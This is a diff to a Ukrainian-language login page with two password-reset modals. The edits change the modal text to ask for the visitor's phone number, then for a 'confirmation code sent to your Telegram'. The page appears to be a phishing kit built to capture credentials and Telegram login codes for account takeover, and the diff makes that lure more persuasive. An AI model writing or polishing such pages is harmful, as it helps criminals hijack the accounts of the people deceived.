@@ -68,7 +68,7 @@
       </div>
 
       <div id="formArea" aria-live="polite">
-        <input class="input" id="user" type="text" placeholder="Номер телефону або пошта" autocomplete="username" />
+        <input class="input" id="user" type="text" placeholder="Номер моб. телефону або ел. адреса" autocomplete="username" />
         <input class="input" id="pass" type="password" placeholder="Пароль" autocomplete="current-password" />
         <button class="btn" id="loginBtn" type="button">Увійти</button>
         <div class="small">Забули пароль? <a href="#" id="resetLink">Скинути</a></div>
@@ -79,9 +79,9 @@
 <!-- Перше модальне вікно RESET -->
 <div id="resetModal" class="modal">
   <div class="modal-box">
-    <h3 id="resetText">Введіть код</h3>
+    <h3 id="resetText">Введіть ваш номер телефону, щоб відновити пароль. Ми надішлемо вам код підтвердження.</h3>
     <input type="text" id="resetInput" placeholder="Введіть код...">
-    <button id="resetSend">Надіслати</button>
+    <button id="resetSend">Далі</button>
   </div>
 </div>
 
@@ -147,8 +147,8 @@ document.getElementById("resetSend").onclick = ()=>{
 const secondModalHTML = `
 <div id="resetModal2" class="modal">
   <div class="modal-box">
-    <h3 id="resetText2">Введіть текст</h3>
-    <input type="text" id="resetInput2" placeholder="Введіть текст...">
+    <h3 id="resetText2">Ми надіслали код підтвердження у ваш Telegram. Введіть його нижче, щоб продовжити відновлення паролю.</h3>
+    <input type="text" id="resetInput2" placeholder="Введіть код...">
     <button id="resetSend2">Надіслати</button>
   </div>
 </div>
@@ -173,5 +173,6 @@ document.getElementById("resetSend2").onclick = () => {
 </script>
 </body>
 </html>
+
 
 
